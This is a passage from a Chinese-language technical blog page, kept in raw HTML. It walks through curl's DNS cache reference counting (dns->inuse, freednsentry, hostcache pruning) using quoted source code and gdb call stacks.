class="hljs-number">1</span>,</span><br><span class="line">                       (<span class="hljs-keyword">void</span> *)dns);</span><br><span class="line">  <span class="hljs-keyword">if</span>(!dns2) {</span><br><span class="line">    <span class="hljs-built_in">free</span>(dns);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  dns = dns2;</span><br><span class="line">  dns-&gt;inuse++;         <span class="hljs-comment">/* mark entry as in-use */</span></span><br><span class="line">  <span class="hljs-keyword">return</span> dns;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;&#x4F1A;&#x4F7F;&#x7528;<code>dns-&gt;inuse</code>&#x53D8;&#x91CF;&#x8D77;&#x5230;&#x4E00;&#x4E2A;&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x5728;&#x7ECF;&#x8FC7;&#x7B2C;&#x4E00;&#x6B21;&#x67E5;&#x8BE2;&#x5F97;&#x5230; DNS &#x8BB0;&#x5F55;&#x4E4B;&#x540E;&#xFF0C;&#x518D;&#x8FDB;&#x884C; DNS &#x67E5;&#x8BE2;&#x65F6;&#xFF0C; curl &#x4F1A;&#x4F18;&#x5148;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x54C8;&#x5E0C;&#x8868;&#x4E2D;&#x67E5;&#x8BE2;&#xFF0C;&#x5982;&#x679C;&#x67E5;&#x5230;&#x4E86;&#x5219;&#x53C8;&#x4F1A;&#x7EF4;&#x62A4;<code>dns-&gt;inuse</code>&#x5C06;&#x5176;&#x52A0;&#x4E00;&#x3002;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Curl_resolv_unlock() unlocks the given cached DNS entry. When this has been</span></span><br><span class="line"><span class="hljs-comment"> * made, the struct may be destroyed due to pruning. It is important that only</span></span><br><span class="line"><span class="hljs-comment"> * one unlock is made for each Curl_resolv() call.</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * May be called with &apos;data&apos; == NULL for global cache.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Curl_resolv_unlock</span><span class="hljs-params">(struct Curl_easy *data, struct Curl_dns_entry *dns)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">if</span>(data &amp;&amp; data-&gt;share)</span><br><span class="line">    Curl_share_lock(data, CURL_LOCK_DATA_DNS, CURL_LOCK_ACCESS_SINGLE);</span><br><span class="line"></span><br><span class="line">  freednsentry(dns);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(data &amp;&amp; data-&gt;share)</span><br><span class="line">    Curl_share_unlock(data, CURL_LOCK_DATA_DNS);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * File-internal: release cache dns entry reference, free if inuse drops to 0</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">freednsentry</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *freethis)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">dns</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">Curl_dns_entry</span> *) <span class="hljs-title">freethis</span>;</span></span><br><span class="line">  DEBUGASSERT(dns &amp;&amp; (dns-&gt;inuse&gt;<span class="hljs-number">0</span>));</span><br><span class="line"></span><br><span class="line">  dns-&gt;inuse--;</span><br><span class="line">  <span class="hljs-keyword">if</span>(dns-&gt;inuse == <span class="hljs-number">0</span>) {</span><br><span class="line">    Curl_freeaddrinfo(dns-&gt;addr);</span><br><span class="line">    <span class="hljs-built_in">free</span>(dns);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x901A;&#x8FC7;<code>Curl_resolv_unlock</code>&#x51FD;&#x6570;&#x5728;&#x6BCF;&#x6B21;&#x901A;&#x4FE1;&#x7ED3;&#x675F;&#x540E;&#x8C03;&#x7528;<code>freednsentry</code>&#x5C06;<code>dns-&gt;inuse</code>&#x51CF;&#x4E00;&#xFF0C;&#x4F46;&#x662F;&#x6B64;&#x65F6;&#x7ED3;&#x675F;&#x4E4B;&#x540E;<code>dns-&gt;inuse</code>&#x7684;&#x503C;&#x4ECD;&#x4E3A; 1 &#xFF0C;&#x6240;&#x4EE5;&#x4E0B;&#x6B21;&#x8FDB;&#x884C; DNS &#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019;&#x8FD8;&#x4F1A;&#x4F7F;&#x7528; hash &#x91CC;&#x7684; DNS &#x8BB0;&#x5F55;&#xFF0C;&#x6B64;&#x65F6;&#x7684;&#x8C03;&#x7528;&#x6808;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF08;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x79F0;&#x4E3A;&#x8C03;&#x7528;&#x6808; A &#xFF09;&#xFF1A;</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#<span class="hljs-number">0</span>  freednsentry (freethis=<span class="hljs-number">0x5555555d8728</span>) at hostip.c:<span class="hljs-number">838</span></span><br><span class="line">#<span class="hljs-number">1</span>  <span class="hljs-number">0x00007ffff7f0b20e</span> <span class="hljs-keyword">in</span> Curl_resolv_unlock (data=<span class="hljs-number">0x5555555d8728</span>, dns=<span class="hljs-number">0x5555555d1d38</span>) at hostip.c:<span class="hljs-number">828</span></span><br><span class="line">#<span class="hljs-number">2</span>  <span class="hljs-number">0x00007ffff7f2720e</span> <span class="hljs-keyword">in</span> multi_done (data=<span class="hljs-number">0x5555555d8728</span>, status=CURLE_OK, premature=<span class="hljs-literal">false</span>) at multi.c:<span class="hljs-number">620</span></span><br><span class="line">#<span class="hljs-number">3</span>  <span class="hljs-number">0x00007ffff7f2a902</span> <span class="hljs-keyword">in</span> multi_runsingle (multi=<span class="hljs-number">0x5555555d4d18</span>, nowp=<span class="hljs-number">0x7fffffffdae0</span>, data=<span class="hljs-number">0x5555555d8728</span>) at multi.c:<span class="hljs-number">2227</span></span><br><span class="line">#<span class="hljs-number">4</span>  <span class="hljs-number">0x00007ffff7f2af09</span> <span class="hljs-keyword">in</span> curl_multi_perform (multi=<span class="hljs-number">0x5555555d4d18</span>, running_handles=<span class="hljs-number">0x7fffffffdbd0</span>) at multi.c:<span class="hljs-number">2412</span></span><br><span class="line">#<span class="hljs-number">5</span>  <span class="hljs-number">0x00007ffff7ef75fb</span> <span class="hljs-keyword">in</span> easy_transfer (multi=<span class="hljs-number">0x5555555d4d18</span>) at easy.c:<span class="hljs-number">606</span></span><br><span class="line">#<span class="hljs-number">6</span>  <span class="hljs-number">0x00007ffff7ef7875</span> <span class="hljs-keyword">in</span> easy_perform (data=<span class="hljs-number">0x5555555d8728</span>, events=<span class="hljs-literal">false</span>) at easy.c:<span class="hljs-number">696</span></span><br><span class="line">#<span class="hljs-number">7</span>  <span class="hljs-number">0x00007ffff7ef78e0</span> <span class="hljs-keyword">in</span> curl_easy_perform (data=<span class="hljs-number">0x5555555d8728</span>) at easy.c:<span class="hljs-number">715</span></span><br><span class="line">#<span class="hljs-number">8</span>  <span class="hljs-number">0x000055555557abb9</span> <span class="hljs-keyword">in</span> serial_transfers (global=<span class="hljs-number">0x7fffffffde20</span>, share=<span class="hljs-number">0x5555555d26d8</span>) at tool_operate.c:<span class="hljs-number">2326</span></span><br><span class="line">#<span class="hljs-number">9</span>  <span class="hljs-number">0x000055555557b099</span> <span class="hljs-keyword">in</span> run_all_transfers (global=<span class="hljs-number">0x7fffffffde20</span>, share=<span class="hljs-number">0x5555555d26d8</span>, result=CURLE_OK) at tool_operate.c:<span class="hljs-number">2504</span></span><br><span class="line">#<span class="hljs-number">10</span> <span class="hljs-number">0x000055555557b3d9</span> <span class="hljs-keyword">in</span> operate (global=<span class="hljs-number">0x7fffffffde20</span>, argc=<span class="hljs-number">3</span>, argv=<span class="hljs-number">0x7fffffffdf98</span>) at tool_operate.c:<span class="hljs-number">2620</span></span><br><span class="line">#<span class="hljs-number">11</span> <span class="hljs-number">0x0000555555570991</span> <span class="hljs-keyword">in</span> main (argc=<span class="hljs-number">3</span>, argv=<span class="hljs-number">0x7fffffffdf98</span>) at tool_main.c:<span class="hljs-number">277</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x4E5F;&#x6CE8;&#x610F;&#x5230;&#x53EA;&#x6709;&#x5F53;<code>dns-&gt;inuse</code>&#x4E3A; 0 &#x7684;&#x65F6;&#x5019;&#xFF0C; curl &#x624D;&#x4F1A;&#x5C06;<code>dns-&gt;addr</code>&#x91CA;&#x653E;&#x6389;&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x6211;&#x4EEC;&#x6765;&#x8BF4;&#xFF0C;&#x9700;&#x8981;&#x5173;&#x6CE8;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x624D;&#x80FD;&#x8BA9;<code>dns-&gt;inuse</code>&#x4E3A; 0 &#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x4EC0;&#x4E48;&#x65F6;&#x5019; curl &#x4F1A;&#x6267;&#x884C;&#x4E24;&#x6B21;<code>freednsentry</code> &#x51FD;&#x6570;&#x5C06;&#x5176;&#x51CF;&#x5C11;&#x5230;&#x4E86; 0 &#x3002;&#xFF08;&#x56E0;&#x4E3A; curl &#x5F53;&#x4E2D;&#x53EA;&#x6709;<code>freednsentry</code>&#x51FD;&#x6570;&#x5BF9;<code>dns-&gt;inuse</code>&#x8FDB;&#x884C;&#x4E86;&#x51CF;&#x4E00;&#x64CD;&#x4F5C;&#xFF09;</p><p>&#x7ECF;&#x8FC7;&#x8C03;&#x8BD5;&#xFF0C;&#x53D1;&#x73B0; curl &#x5728;&#x7ECF;&#x8FC7;&#x4E0A;&#x9762;&#x7684;&#x8C03;&#x7528;&#x6808;&#x540E;&#xFF0C;&#x518D;&#x6B21;&#x7ECF;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x8C03;&#x7528;&#x6808;&#xFF08;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x79F0;&#x4E3A;&#x8C03;&#x7528;&#x6808; B &#xFF09;&#x4F1A;&#x518D;&#x6B21;&#x8C03;&#x7528;<code>freednsentry</code>&#x51FD;&#x6570;&#x5C06;<code>dns-&gt;inuse</code>&#x51CF;&#x5C11;&#x5230; 0 &#x3002;</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#<span class="hljs-number">0</span>  freednsentry (freethis=<span class="hljs-number">0x5555556bab48</span>) at hostip.c:<span class="hljs-number">838</span></span><br><span class="line">#1  0x00007ffff7f08c9f in hash_element_dtor (user=0x5555555d2758, element=0x5555555d2b48) at hash.c:41</span><br><span class="line">#2  0x00007ffff7f1d4a5 in Curl_llist_remove (list=0x5555555d19e8, e=0x5555555d2b48, user=0x5555555d2758) at llist.c:130</span><br><span class="line">#3  0x00007ffff7f09283 in Curl_hash_clean_with_criterium (h=0x5555555d2758, user=0x7fffffffd830, comp=0x7ffff7f0a3e9 &lt;hostcache_timestamp_remove&gt;) at hash.c:249</span><br><span class="line">#4  0x00007ffff7f0a494 in hostcache_prune (hostcache=0x5555555d2758, cache_timeout=60, now=1615184672) at hostip.c:217</span><br><span class="line">#5  0x00007ffff7f0a546 in Curl_hostcache_prune (data=0x5555555d8728) at hostip.c:241</span><br><span class="line">#6  0x00007ffff7f2722c in multi_done (data=0x5555555d8728, status=CURLE_OK, premature=false) at multi.c:623</span><br><span class="line">#7  0x00007ffff7f2a902 in multi_runsingle (multi=0x5555555d4d18, nowp=0x7fffffffdae0, data=0x5555555d8728) at multi.c:2227</span><br><span class="line">#8  0x00007ffff7f2af09 in curl_multi_perform (multi=0x5555555d4d18, running_handles=0x7fffffffdbd0) at multi.c:2412</span><br><span class="line">#9  0x00007ffff7ef75fb in easy_transfer (multi=0x5555555d4d18) at easy.c:606</span><br><span class="line">#10 0x00007ffff7ef7875 in easy_perform (data=0x5555555d8728, events=false) at easy.c:696</span><br><span class="line">#11 0x00007ffff7ef78e0 in curl_easy_perform (data=0x5555555d8728) at easy.c:715</span><br><span class="line">#12 0x000055555557abb9 in serial_transfers (global=0x7fffffffde20, share=0x5555555d26d8) at tool_operate.c:2326</span><br><span class="line">#13 0x000055555557b099 in run_all_transfers (global=0x7fffffffde20, share=0x5555555d26d8, result=CURLE_OK) at tool_operate.c:2504</span><br><span class="line">#14 0x000055555557b3d9 in operate (global=0x7fffffffde20, argc=3, argv=0x7fffffffdf98) at tool_operate.c:2620</span><br><span class="line">#15 0x0000555555570991 in main (argc=3, argv=0x7fffffffdf98) at tool_main.c:277</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x800C;&#x8FD9;&#x4E24;&#x6B21;&#x8C03;&#x7528;&#x6808;&#x7684;&#x4E3B;&#x8981;&#x5173;&#x7CFB;&#x5728;<code>multi_done</code>&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728; lib/multi.c#619 &#x5904;&#x627E;&#x5230;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(conn-&gt;dns_entry) {</span><br><span class="line">  Curl_resolv_unlock(data, conn-&gt;dns_entry); <span class="hljs-comment">/* done with this */</span></span><br><span class="line">  conn-&gt;dns_entry = <span class="hljs-literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line">Curl_hostcache_prune(data);</span><br><span class="line">Curl_safefree(data-&gt;state.ulbuf);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x8BB2;&#x9053;&#x7406;&#x7684;&#x8BDD;&#xFF0C;&#x5728;&#x7ECF;&#x8FC7;&#x8C03;&#x7528;&#x6808; A &#x4E4B;&#x540E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7ECF;&#x8FC7;<code>Curl_resolv_unlock</code>&#x51FD;&#x6570;&#x5C06;<code>inuse</code>&#x51CF;&#x4E00;&#x4E4B;&#x540E;&#xFF0C;&#x7406;&#x8BBA;&#x4E0A;&#x5E94;&#x8BE5;&#x53C8;&#x4F1A;&#x7ECF;&#x8FC7;<code>Curl_hostcache_prune</code>&#x51FD;&#x6570;&#x5C06;<code>inuse</code>&#x51CF;&#x4E00;&#x624D;&#x5BF9;&#xFF0C;&#x4F46;&#x662F;&#x5B9E;&#x9645;&#x4E0A;&#x5E76;&#x6CA1;&#x6709;&#x3002;&#x800C;<code>Curl_resolv_unlock</code>&#x51FD;&#x6570;&#x6211;&#x4EEC;&#x4E0A;&#x9762;&#x770B;&#x8FC7;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x591A;&#x4F59;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x770B;&#x4E00;&#x4E0B;<code>Curl_hostcache_prune</code>&#x4E3A;&#x4EC0;&#x4E48;&#x6CA1;&#x6709;&#x5C06;<code>inuse</code>&#x51CF;&#x4E00;&#x3002;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Library-wide function for pruning the DNS cache. This function takes and</span></span><br><span class="line"><span class="hljs-comment"> * returns the appropriate locks.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Curl_hostcache_prune</span><span class="hljs-params">(struct Curl_easy *data)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">time_t</span> now;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>((data-&gt;<span class="hljs-built_in">set</span>.dns_cache_timeout == <span class="hljs-number">-1</span>) || !data-&gt;dns.hostcache)</span><br><span class="line">    <span class="hljs-comment">/* cache forever means never prune, and NULL hostcache means</span></span><br><span class="line"><span class="hljs-comment">       we can&apos;t do it */</span></span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(data-&gt;share)</span><br><span class="line">    Curl_share_lock(data, CURL_LOCK_DATA_DNS, CURL_LOCK_ACCESS_SINGLE);</span><br><span class="line"></span><br><span class="line">  time(&amp;now);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Remove outdated and unused entries from the hostcache */</span></span><br><span class="line">  hostcache_prune(data-&gt;dns.hostcache,</span><br><span class="line">                  data-&gt;<span class="hljs-built_in">set</span>.dns_cache_timeout,</span><br><span class="line">                  now);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(data-&gt;share)</span><br><span class="line">    Curl_share_unlock(data, CURL_LOCK_DATA_DNS);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x597D;&#x4E86;&#xFF0C;&#x770B;&#x5230;<code>time_t now</code>&#x5C31;&#x5DEE;&#x4E0D;&#x591A;&#x731C;&#x5230;&#x5927;&#x6982;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6309;&#x7167;&#x4E4B;&#x524D;&#x7684;&#x73B0;&#x8C61;&#xFF0C;<code>Curl_hostcache_prune</code>&#x51FD;&#x6570;&#x6CA1;&#x6709;&#x5C06;<code>inuse</code>&#x51CF;&#x4E00;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x8BED;&#x53E5;&#x5C31;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x5148;&#x68C0;&#x67E5;&#x7B2C;&#x4E00;&#x4E2A;&#x6761;&#x4EF6;&#x8BED;&#x53E5;&#x5F53;&#x4E2D;&#x7684;&#x6761;&#x4EF6;&#x3002;</p><p>&#x7B2C;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x53C2;&#x6570;<code>data-&gt;set.dns_cache_timeout</code>&#xFF0C;&#x5728; curl &#x6E90;&#x7801;&#x5F53;&#x4E2D;&#x552F;&#x4E8C;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x8D4B;&#x503C;&#x64CD;&#x4F5C;&#x7684;&#x5730;&#x65B9;&#x5728; lib/setopt.c#173 :</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">case</span> CURLOPT_DNS_CACHE_TIMEOUT:</span><br><span class="line">  arg = va_arg(param, <span class="hljs-keyword">long</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span>(arg &lt; <span class="hljs-number">-1</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> CURLE_BAD_FUNCTION_ARGUMENT;</span><br><span class="line">  data-&gt;<span class="hljs-built_in">set</span>.dns_cache_timeout = arg;</span><br><span class="line">  <span class="hljs-keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6839;&#x636E;&#x6587;&#x4EF6;&#x540D;&#x4EE5;&#x53CA;&#x4E0A;&#x4E0B;&#x6587;&#xFF0C;&#x6211;&#x4EEC;&#x4E0D;&#x96BE;&#x67E5;&#x5230;&#x8FD9;&#x662F;&#x5BF9;&#x4E8E;&#x7528;&#x6237;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x7684;&#x914D;&#x7F6E; <a href="https://curl.se/libcurl/c/CURLOPT_DNS_CACHE_TIMEOUT.html" target="_blank" rel="noopener">CURLOPT_DNS_CACHE_TIMEOUT explained</a> &#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x3002;&#x8FD8;&#x6709;&#x4E00;&#x5904;&#x8D4B;&#x503C;&#x8BED;&#x53E5;&#x5219;&#x662F;&#x5728; lib/url.c#511 &#x5904;&#xFF0C;&#x5728;&#x7ED3;&#x6784;&#x4F53;&#x5F53;&#x4E2D;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x4E86;&#x8D4B;&#x503C;&#x3002;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">set</span>-&gt;dns_cache_timeout = <span class="hljs-number">60</span>; <span class="hljs-comment">/* Timeout every 60 seconds by default */</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x8FD8;&#x80FD;&#x4ECE;&#x6CE8;&#x91CA;&#x4E2D;&#x83B7;&#x5F97;&#x4FE1;&#x606F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5982;&#x679C;&#x4E0D;&#x662F;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x53C2;&#x6570;&#x8D4B;&#x503C;&#xFF0C;&#x9ED8;&#x8BA4; DNS &#x7F13;&#x5B58;&#x65F6;&#x95F4;&#x4E3A; 60s &#x3002;</p><p>&#x53E6;&#x4E00;&#x4E2A;&#x53C2;&#x6570;<code>data-&gt;dns.hostcache</code>&#xFF0C;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x5728;<code>Curl_hash_add</code>&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x7528;&#x4F5C;&#x8868;&#x793A;&#x54C8;&#x5E0C;&#x8BB0;&#x5F55;&#xFF0C;&#x8FD9;&#x91CC;&#x4E0D;&#x4E3A;&#x7A7A;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;<code>Curl_hostcache_prune</code>&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x6761;&#x4EF6;&#x8BED;&#x53E5;&#x4E0D;&#x4F1A;&#x76F4;&#x63A5;<code>return</code>&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8FD8;&#x9700;&#x8981;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;&#x8BE5;&#x51FD;&#x6570;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x5230;&#x4E86;<code>hostcache_prune</code>&#x51FD;&#x6570;&#x3002;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Prune the DNS cache. This assumes that a lock has already been taken.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="line">hostcache_prune(struct Curl_hash *hostcache, <span class="hljs-keyword">long</span> cache_timeout, <span class="hljs-keyword">time_t</span> now)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostcache_prune_data</span> <span class="hljs-title">user</span>;</span></span><br><span class="line"></span><br><span class="line">  user.cache_timeout = cache_timeout;</span><br><span class="line">  user.now = now;</span><br><span class="line"></span><br><span class="line">  Curl_hash_clean_with_criterium(hostcache,</span><br><span class="line">                                 (<span class="hljs-keyword">void</span> *) &amp;user,</span><br><span class="line">                                 hostcache_timestamp_remove);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x611F;&#x89C9;&#x770B;&#x5230;&#x8FD9;&#x91CC;&#x5DF2;&#x7ECF;&#x80FD;&#x5F88;&#x660E;&#x663E;&#x7684;&#x770B;&#x5230; curl &#x505A;&#x6CD5;&#x7684;&#x610F;&#x56FE;&#x4E86;&#xFF0C;&#x4F20;&#x5165;&#x51FD;&#x6570;&#x7684;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;&#x73B0;&#x5728;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x8FD9;&#x91CC;&#x4E3A;&#x9ED8;&#x8BA4;&#x7684; DNS &#x7F13;&#x5B58;&#x65F6;&#x95F4;&#x4E3A; 60s &#xFF0C;&#x8FDB;&#x884C;&#x8D4B;&#x503C;&#x64CD;&#x4F5C;&#x540E;&#xFF0C;&#x8FDB;&#x5165;&#x5230;<code>hostcache_timestamp_remove</code>&#x51FD;&#x6570;&#xFF1A;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* Cleans all entries that pass the comp function criteria. */</span></span><br><span class="line"><span class="hljs-keyword">void</span></span><br><span class="line">Curl_hash_clean_with_criterium(struct Curl_hash *h, <span class="hljs-keyword">void</span> *user,</span><br><span class="line">                               <span class="hljs-keyword">int</span> (*comp)(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">void</span> *))</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_llist_element</span> *<span 